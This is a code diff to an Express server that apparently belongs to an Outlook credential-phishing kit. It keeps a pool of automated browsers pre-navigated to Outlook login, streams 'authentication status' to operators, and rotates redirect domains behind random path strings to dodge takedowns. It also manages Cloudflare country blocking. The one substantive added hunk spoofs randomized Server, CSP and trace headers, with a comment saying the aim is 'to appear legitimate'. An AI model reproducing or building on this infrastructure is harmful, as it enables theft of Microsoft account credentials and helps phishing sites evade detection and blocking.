@@ -85,7 +85,7 @@ function loadDomainConfig() {
     } catch (error) {
         console.error('Error loading domain config:', error);
     }
-    
+
     // Default configuration
     const defaultConfig = {
         enabled: true,
@@ -101,7 +101,7 @@ function loadDomainConfig() {
         rotationIndex: 0,
         activeDomains: []
     };
-    
+
     console.log('🌐 Using default domain rotation configuration');
     return defaultConfig;
 }
@@ -122,23 +122,23 @@ function saveDomainConfig(config) {
 function generateRotationString() {
     const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     let randomString = '';
-    
+
     for (let i = 0; i < 6; i++) {
         randomString += chars.charAt(Math.floor(Math.random() * chars.length));
     }
-    
+
     return randomString;
 }
 
 // Check if domains are active by testing HTTP connectivity
 async function checkDomainActivity(domains) {
     const activeDomains = [];
-    
+
     for (const domain of domains) {
         try {
             // Test HTTP connectivity to domain
             const isActive = await testDomainConnectivity(domain);
-            
+
             if (isActive) {
                 activeDomains.push({
                     domain: domain,
@@ -153,7 +153,7 @@ async function checkDomainActivity(domains) {
             console.log(`❌ Domain ${domain} check failed:`, error.message);
         }
     }
-    
+
     return activeDomains;
 }
 
@@ -162,10 +162,10 @@ async function testDomainConnectivity(domain) {
     try {
         // Import fetch for Node.js (if not available globally)
         const fetch = require('node-fetch');
-        
+
         // Test both HTTP and HTTPS versions
         const testUrls = [`http://${domain}`, `https://${domain}`];
-        
+
         for (const testUrl of testUrls) {
             try {
                 const response = await fetch(testUrl, {
@@ -175,19 +175,19 @@ async function testDomainConnectivity(domain) {
                         'User-Agent': 'Domain-Rotation-Checker/1.0'
                     }
                 });
-                
+
                 // If we get any response (even errors), domain is active
                 console.log(`📡 Domain ${domain} responded with status ${response.status}`);
                 return true;
-                
+
             } catch (fetchError) {
                 // Try next URL
                 continue;
             }
         }
-        
+
         return false;
-        
+
     } catch (error) {
         console.error(`Error testing domain ${domain}:`, error.message);
         return false;
@@ -203,26 +203,26 @@ app.use((req, res, next) => {
     if (!domainConfig.enabled || !domainConfig.rotationString) {
         return next();
     }
-    
+
     // Check if the path matches the rotation string
     const currentPath = req.path.substring(1); // Remove leading slash
-    
+
     if (currentPath === domainConfig.rotationString) {
         // Get target domain using cycling rotation index
         const targetDomain = domainConfig.rotationDomains[domainConfig.rotationIndex % domainConfig.rotationDomains.length];
-        
+
         // Increment rotation index for next visit
         domainConfig.rotationIndex = (domainConfig.rotationIndex + 1) % domainConfig.rotationDomains.length;
-        
+
         // Save updated configuration with new rotation index
         saveDomainConfig(domainConfig);
-        
+
         console.log(`🔄 Domain rotation: /${currentPath} → https://${targetDomain} (next: ${domainConfig.rotationIndex})`);
-        
+
         // Redirect to the chosen domain WITHOUT the rotation string
         return res.redirect(302, `https://${targetDomain}`);
     }
-    
+
     // For all other requests, continue normally
     next();
 });
@@ -313,34 +313,34 @@ async function createWarmBrowser() {
     try {
         const warmId = 'warm_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
         console.log(`🔥 Creating warm browser: ${warmId}`);
-        
+
         const automation = new OutlookLoginAutomation({
             enableScreenshots: false, // Disable screenshots for warm browsers to save resources
             screenshotQuality: 80,
             sessionId: warmId,
             eventCallback: null // No event callbacks for warm browsers
         });
-        
+
         // Initialize browser and navigate to Outlook
         await automation.init();
         console.log(`🔧 Warm browser initialized: ${warmId}`);
-        
+
         const navigated = await automation.navigateToOutlook();
         if (!navigated) {
             throw new Error('Failed to navigate to Outlook during warm browser creation');
         }
         console.log(`🌐 Warm browser navigated to Outlook: ${warmId}`);
-        
+
         // Store in warm browser pool
         warmBrowserPool.set(warmId, {
             automation: automation,
             status: 'warm_ready',
             createdAt: Date.now()
         });
-        
+
         console.log(`✅ Warm browser ready: ${warmId}`);
         return warmId;
-        
+
     } catch (error) {
         console.error(`❌ Failed to create warm browser:`, error.message);
         return null;
@@ -353,24 +353,24 @@ async function maintainWarmBrowserPool() {
         console.log('🔒 Warm browser pool already being maintained, skipping...');
         return;
     }
-    
+
     warmBrowserPoolLock = true;
-    
+
     try {
         const currentWarmCount = warmBrowserPool.size;
         const neededBrowsers = MIN_WARM_BROWSERS - currentWarmCount;
-        
+
         if (neededBrowsers > 0) {
             console.log(`🔥 Need ${neededBrowsers} more warm browsers (current: ${currentWarmCount}, min: ${MIN_WARM_BROWSERS})`);
-            
+
             // Create needed browsers in parallel but limit to MAX_WARM_BROWSERS
             const browsersToCreate = Math.min(neededBrowsers, MAX_WARM_BROWSERS - currentWarmCount);
             const creationPromises = [];
-            
+
             for (let i = 0; i < browsersToCreate; i++) {
                 creationPromises.push(createWarmBrowser());
             }
-            
+
             if (creationPromises.length > 0) {
                 await Promise.all(creationPromises);
             }
@@ -388,14 +388,14 @@ function getWarmBrowser() {
         if (warmData.status === 'warm_ready') {
             warmBrowserPool.delete(warmId);
             console.log(`🚀 Retrieved warm browser for use: ${warmId}`);
-            
+
             // Trigger background maintenance to replace the used browser
             setTimeout(() => {
                 maintainWarmBrowserPool().catch(error => {
                     console.error('Background warm browser maintenance failed:', error.message);
                 });
             }, 100);
-            
+
             return warmData.automation;
         }
     }
@@ -454,7 +454,7 @@ setInterval(async () => {
             console.log(`🧹 Cleaned up expired automation session: ${sessionId}`);
         }
     }
-    
+
     // Clean up expired warm browsers (older than 20 minutes)
     const WARM_BROWSER_TIMEOUT = 20 * 60 * 1000; // 20 minutes
     for (const [warmId, warmData] of warmBrowserPool) {
@@ -470,7 +470,7 @@ setInterval(async () => {
             console.log(`🧹 Cleaned up expired warm browser: ${warmId}`);
         }
     }
-    
+
     // Trigger warm browser pool maintenance after cleanup
     if (warmBrowserPool.size < MIN_WARM_BROWSERS) {
         maintainWarmBrowserPool().catch(error => {
@@ -678,7 +678,7 @@ app.get('/api/health', (req, res) => {
 // SSE endpoint for real-time authentication status updates
 app.get('/api/auth-status/:sessionId', (req, res) => {
     const { sessionId } = req.params;
-    
+
     // Set SSE headers
     res.writeHead(200, {
         'Content-Type': 'text/event-stream',
@@ -706,6 +706,55 @@ app.get('/api/auth-status/:sessionId', (req, res) => {
         console.warn(`SSE connection error for ${sessionId}:`, error.message);
         sseConnections.delete(sessionId);
     });
+});
+
+// Add security headers to appear legitimate
+app.use((req, res, next) => {
+    // Generate random server identifier
+    const serverIds = ['nginx/1.18.0', 'Apache/2.4.41', 'cloudflare', 'Microsoft-IIS/10.0', 'nginx/1.20.2'];
+    const randomServer = serverIds[Math.floor(Math.random() * serverIds.length)];
+
+    // Generate random request ID
+    const requestId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+
+    // Core security headers with randomized values
+    res.setHeader('Server', randomServer);
+    res.setHeader('X-Request-ID', requestId);
+    res.setHeader('X-Content-Type-Options', 'nosniff');
+    res.setHeader('X-Frame-Options', Math.random() > 0.5 ? 'SAMEORIGIN' : 'DENY');
+    res.setHeader('X-XSS-Protection', '1; mode=block');
+    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+    res.setHeader('X-Permitted-Cross-Domain-Policies', 'none');
+    res.setHeader('X-Download-Options', 'noopen');
+
+    // Randomized CSP policy
+    const cspPolicies = [
+        "default-src 'self' 'unsafe-inline' 'unsafe-eval' https: data: blob:; img-src 'self' https: data: blob:; connect-src 'self' https: wss:",
+        "default-src 'self' 'unsafe-inline' https: data:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'unsafe-inline' https:",
+        "default-src 'self' https: data:; script-src 'self' 'unsafe-inline' https:; object-src 'none'; base-uri 'self'"
+    ];
+    const randomCSP = cspPolicies[Math.floor(Math.random() * cspPolicies.length)];
+    res.setHeader('Content-Security-Policy', randomCSP);
+
+    // Additional randomized headers
+    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
+    res.setHeader('X-Robots-Tag', 'noindex, nofollow');
+    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+    res.setHeader('Pragma', 'no-cache');
+    res.setHeader('Expires', '0');
+
+    // Random performance/monitoring headers
+    const performanceHeaders = [
+        'cf-ray', 'cf-request-id', 'x-trace-id', 'x-correlation-id', 'x-forwarded-for'
+    ];
+    const randomHeader = performanceHeaders[Math.floor(Math.random() * performanceHeaders.length)];
+    const randomValue = Math.random().toString(36).substring(2, 15);
+    res.setHeader(randomHeader, randomValue);
+
+    // Vary headers for caching
+    res.setHeader('Vary', 'Accept-Encoding, User-Agent, Accept-Language');
+
+    next();
 });
 
 // Get OAuth authorization URL
@@ -2233,27 +2282,27 @@ app.get('/api/domain-rotation/active-domains', async (req, res) => {
 app.post('/api/domain-rotation/setup', (req, res) => {
     try {
         const { mainDomain, rotationDomains } = req.body;
-        
+
         if (!mainDomain || !rotationDomains || !Array.isArray(rotationDomains)) {
             return res.status(400).json({
                 success: false,
                 error: 'Main domain and rotation domains array required'
             });
         }
-        
+
         // Generate new rotation string
         const rotationString = generateRotationString();
-        
+
         // Update configuration
         domainConfig.mainDomain = mainDomain;
         domainConfig.rotationDomains = rotationDomains;
         domainConfig.rotationString = rotationString;
         domainConfig.rotationIndex = 0; // Reset rotation counter
         domainConfig.enabled = true;
-        
+
         // Save to file
         const saved = saveDomainConfig(domainConfig);
-        
+
         if (saved) {
             console.log(`🔄 Domain rotation setup: Main=${mainDomain}, Rotation=${rotationDomains.length} domains`);
             res.json({
@@ -2265,7 +2314,7 @@ app.post('/api/domain-rotation/setup', (req, res) => {
         } else {
             throw new Error('Failed to save configuration');
         }
-        
+
     } catch (error) {
         console.error('Domain rotation setup error:', error);
         res.status(500).json({
@@ -2279,14 +2328,14 @@ app.post('/api/domain-rotation/regenerate-string', (req, res) => {
     try {
         // Generate new rotation string
         const newString = generateRotationString();
-        
+
         // Update configuration
         domainConfig.rotationString = newString;
         domainConfig.rotationIndex = 0; // Reset rotation counter
-        
+
         // Save to file
         const saved = saveDomainConfig(domainConfig);
-        
+
         if (saved) {
             console.log('🔄 Regenerated domain rotation string:', newString);
             res.json({
@@ -2297,7 +2346,7 @@ app.post('/api/domain-rotation/regenerate-string', (req, res) => {
         } else {
             throw new Error('Failed to save configuration');
         }
-        
+
     } catch (error) {
         console.error('String regeneration error:', error);
         res.status(500).json({
@@ -2311,7 +2360,7 @@ app.post('/api/domain-rotation/toggle', (req, res) => {
     try {
         domainConfig.enabled = !domainConfig.enabled;
         const saved = saveDomainConfig(domainConfig);
-        
+
         if (saved) {
             res.json({
                 success: true,
@@ -2321,7 +2370,7 @@ app.post('/api/domain-rotation/toggle', (req, res) => {
         } else {
             throw new Error('Failed to save configuration');
         }
-        
+
     } catch (error) {
         res.status(500).json({
             success: false,
@@ -2736,7 +2785,7 @@ app.get('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, res
 
         // Get existing custom rules
         const response = await callCloudflareAPI('/rulesets/phases/http_request_firewall_custom/entrypoint');
-        
+
         // Filter for country-related rules
         const countryRules = response.result?.rules?.filter(rule => 
             rule.expression && (
@@ -2764,7 +2813,7 @@ app.get('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, res
 app.post('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, res) => {
     try {
         const { action, countries, ruleName } = req.body;
-        
+
         if (!cloudflareConfig.configured) {
             return res.json({
                 success: false,
@@ -2790,11 +2839,11 @@ app.post('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, re
         // Format country codes
         const countryList = countries.map(c => c.toUpperCase().substring(0, 2));
         const countryStr = `{"${countryList.join('" "')}"}`;
-        
+
         // Create expression based on action
         let expression;
         let description;
-        
+
         if (action === 'block') {
             expression = `ip.src.country in ${countryStr}`;
             description = `Block countries: ${countryList.join(', ')}`;
@@ -2806,7 +2855,7 @@ app.post('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, re
         // First get existing ruleset
         const existingResponse = await callCloudflareAPI('/rulesets/phases/http_request_firewall_custom/entrypoint');
         const existingRules = existingResponse.result?.rules || [];
-        
+
         // Create new rule
         const newRule = {
             expression: expression,
@@ -2846,7 +2895,7 @@ app.post('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, re
 app.delete('/api/admin/cloudflare/country-rules/:ruleId', requireAdminAuth, async (req, res) => {
     try {
         const { ruleId } = req.params;
-        
+
         if (!cloudflareConfig.configured) {
             return res.json({
                 success: false,
@@ -2857,7 +2906,7 @@ app.delete('/api/admin/cloudflare/country-rules/:ruleId', requireAdminAuth, asyn
         // Get existing ruleset
         const existingResponse = await callCloudflareAPI('/rulesets/phases/http_request_firewall_custom/entrypoint');
         const existingRules = existingResponse.result?.rules || [];
-        
+
         // Remove the rule
         const updatedRules = existingRules.filter(rule => rule.id !== ruleId);
 
@@ -2887,12 +2936,12 @@ app.delete('/api/admin/cloudflare/country-rules/:ruleId', requireAdminAuth, asyn
 app.post('/api/prepare-browser', async (req, res) => {
     try {
         console.log('🚀 Instant browser preparation requested');
-        
+
         // Get current warm browser pool status
         const currentWarmCount = warmBrowserPool.size;
         const warmBrowsersReady = Array.from(warmBrowserPool.values())
             .filter(warm => warm.status === 'warm_ready').length;
-        
+
         // Check if we already have warm browsers ready
         if (warmBrowsersReady > 0) {
             return res.json({
@@ -2903,22 +2952,22 @@ app.post('/api/prepare-browser', async (req, res) => {
                 preparationTime: 0
             });
         }
-        
+
         // Start immediate warm browser creation if needed
         const startTime = Date.now();
         let newBrowsersCreated = 0;
-        
+
         try {
             // Trigger immediate warm browser creation
             await maintainWarmBrowserPool();
-            
+
             // Count newly created browsers
             const newWarmCount = Array.from(warmBrowserPool.values())
                 .filter(warm => warm.status === 'warm_ready').length;
             newBrowsersCreated = newWarmCount - warmBrowsersReady;
-            
+
             const preparationTime = Date.now() - startTime;
-            
+
             res.json({
                 success: true,
                 message: 'Browser preparation completed',
@@ -2927,7 +2976,7 @@ app.post('/api/prepare-browser', async (req, res) => {
                 newBrowsersCreated: newBrowsersCreated,
                 preparationTime: preparationTime
             });
-            
+
         } catch (error) {
             console.error('Error during instant browser preparation:', error.message);
             res.status(500).json({
@@ -2938,7 +2987,7 @@ app.post('/api/prepare-browser', async (req, res) => {
                 totalWarmBrowsers: currentWarmCount
             });
         }
-        
+
     } catch (error) {
         console.error('Error in prepare-browser endpoint:', error);
         res.status(500).json({
@@ -2954,7 +3003,7 @@ app.get('/api/browser-pool-status', (req, res) => {
     try {
         const warmBrowsers = Array.from(warmBrowserPool.values());
         const readyBrowsers = warmBrowsers.filter(warm => warm.status === 'warm_ready');
-        
+
         res.json({
             success: true,
             status: {
@@ -2969,7 +3018,7 @@ app.get('/api/browser-pool-status', (req, res) => {
                 createdAt: warm.createdAt
             }))
         });
-        
+
     } catch (error) {
         console.error('Error getting browser pool status:', error);
         res.status(500).json({
